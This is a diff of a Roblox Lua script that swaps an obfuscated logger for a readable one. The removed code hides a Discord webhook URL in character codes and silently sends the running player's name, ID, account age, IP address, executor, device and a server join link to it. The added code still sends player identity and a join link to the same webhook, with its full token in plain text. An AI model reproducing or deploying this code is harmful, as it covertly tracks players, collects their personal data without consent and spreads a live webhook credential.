@@ -1,57 +1,46 @@
-local _0xB00B5 = game:GetService
-local _0xC0D3R = _0xB00B5("HttpService")
-local _0xB00BS = _0xB00B5("Players").LocalPlayer
-if not _0xB00BS then
-    warn("LocalPlayer is nil! This code must run on the client.")
-end
-local _0x69 = _0xB00B5("MarketplaceService")
-local function _0xH4X0R(u) return string.char(table.unpack(u)) end
-local _0xUR1 = {"104", "116", "116", "112", "115", ":", "/", "/", "100", "105", "115", "99", "111", "114", "100", ".", "99", "111", "109", "/", "97", "112", "105", "/", "119", "101", "98", "104", "111", "111", "107", "115", "/", "1366093954726101012", "/", "7ciBVLgguCpWBwuHUeSYB6L4v3ytPvIpxl11tkEmANA3AExUvCSsaKx_S1tlEkTMX0zJ"}
-local _0xW3BH00K = table.concat(_0xUR1)
-local _, _0xPL4C3 = pcall(function() return _0x69:GetProductInfo(game.PlaceId) end)
-local _0xG4M3 = (_ and _0xPL4C3.Name) or "???"
-local _0x3X3C = "Unknown_Executor"
-if identifyexecutor then
-    _0x3X3C = identifyexecutor()
-else
-    warn("identifyexecutor is not available.")
-end
-local _0xD3V1C3 = "Unknown_Device"
-if UserSettings and pcall(function() return UserSettings():GetService("UserGameSettings").MasterVolume end) then
-    _0xD3V1C3 = "PC"
-elseif game:GetService("UserInputService").TouchEnabled then
-    _0xD3V1C3 = "Mobile"
-elseif game:GetService("GuiService"):IsTenFootInterface() then
-    _0xD3V1C3 = "Console"
-end
-local _0x1P = "???"
-pcall(function()
-    _0x1P = _0xC0D3R:GetAsync("https://api.ipify.org")
-end)
-local _0xSCR1PT = (debug.getinfo and debug.getinfo(2) and debug.getinfo(2).short_src) or "Loadstring"
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local MarketplaceService = game:GetService("MarketplaceService")
 
-if _0x3X3C ~= "Delta" then
-    local _0xD4T4 = {
-        ["username"] = "Execution_Alert",
-        ["embeds"] = {{
-            ["title"] = "⚡ Script Execute! ⚡",
-            ["color"] = tonumber("0x" .. tostring("00ff00")),
-            ["fields"] = {
-                {["name"] = "Player Name", ["value"] = _0xB00BS.Name, ["inline"] = true},
-                {["name"] = "Player ID", ["value"] = tostring(_0xB00BS.UserId), ["inline"] = true},
-                {["name"] = "Game", ["value"] = _0xG4M3, ["inline"] = false},
-                {["name"] = "Server Join", ["value"] = "[Join Here](https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId .. ")", ["inline"] = false},
-                {["name"] = "Account Age", ["value"] = tostring(_0xB00BS.AccountAge) .. " days", ["inline"] = true},
-                {["name"] = "IP Address", ["value"] = _0x1P, ["inline"] = false},
-                {["name"] = "Script Source", ["value"] = _0xSCR1PT, ["inline"] = false},
-                {["name"] = "Execution Time", ["value"] = os.date("%c"), ["inline"] = false}
+local webhookUrl = "https://discord.com/api/webhooks/1366093954726101012/7ciBVLgguCpWBwuHUeSYB6L4v3ytPvIpxl11tkEmANA3AExUvCSsaKx_S1tlEkTMX0zJ"  -- Replace with your webhook URL
+
+local function getGameName()
+    local success, result = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    return (success and result.Name) or "???"
+end
+
+local function sendWebhook()
+    local playerName = Player.Name
+    local playerId = Player.UserId
+    local accountAge = Player.AccountAge
+    local gameName = getGameName()
+    local jobId = game.JobId
+    local timeExecuted = os.date("%c")
+    
+    local data = {
+        username = "Execution Alert",
+        embeds = {{
+            title = "Script Execute!",
+            color = tonumber("0x00ff00"),
+            fields = {
+                {name = "Username", value = playerName, inline = true},
+                {name = "UserId", value = tostring(playerId), inline = true},
+                {name = "Game", value = gameName, inline = false},
+                {name = "JoinServer", value = "[ClickHere](https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. jobId .. ")", inline = false},
+                {name = "AccountAge", value = tostring(accountAge) .. " days", inline = true},
+                {name = "JobId", value = jobId, inline = true},
+                {name = "Time", value = timeExecuted, inline = false}
             }
         }}
     }
-    local success, errorMsg = pcall(function()
-        _0xC0D3R:PostAsync(_0xW3BH00K, _0xC0D3R:JSONEncode(_0xD4T4))
+
+    local jsonData = HttpService:JSONEncode(data)
+    pcall(function()
+        HttpService:PostAsync(webhookUrl, jsonData)
     end)
-    if not success then
-        warn("Error Loading!" .. errorMsg)
-    end
 end
+
+sendWebhook()
